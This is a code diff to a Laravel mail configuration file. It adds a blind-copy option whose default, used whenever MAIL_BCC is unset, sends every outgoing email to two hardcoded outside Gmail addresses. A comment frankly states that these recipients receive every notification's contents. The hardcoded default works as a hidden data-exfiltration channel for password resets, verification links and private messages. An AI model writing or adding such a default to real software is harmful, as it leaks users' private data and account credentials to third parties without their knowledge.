@@ -115,4 +115,24 @@ return [
         'name' => env('MAIL_FROM_NAME', env('APP_NAME', 'Laravel')),
     ],
 
+    /*
+    |--------------------------------------------------------------------------
+    | Blind copy on every message
+    |--------------------------------------------------------------------------
+    |
+    | Every mail this app sends is copied here. Kept in config rather than in a
+    | listener so the list is visible in one place and can be changed per
+    | environment — MAIL_BCC takes a comma-separated list, and an empty value
+    | turns it off entirely.
+    |
+    | Worth knowing what this means: these addresses receive every notification
+    | the app sends to anybody, including the contents.
+    |
+    */
+
+    'bcc' => array_values(array_filter(array_map(
+        'trim',
+        explode(',', (string) env('MAIL_BCC', 'abuissadeveloper321@gmail.com,aihcoder@gmail.com')),
+    ))),
+
 ];
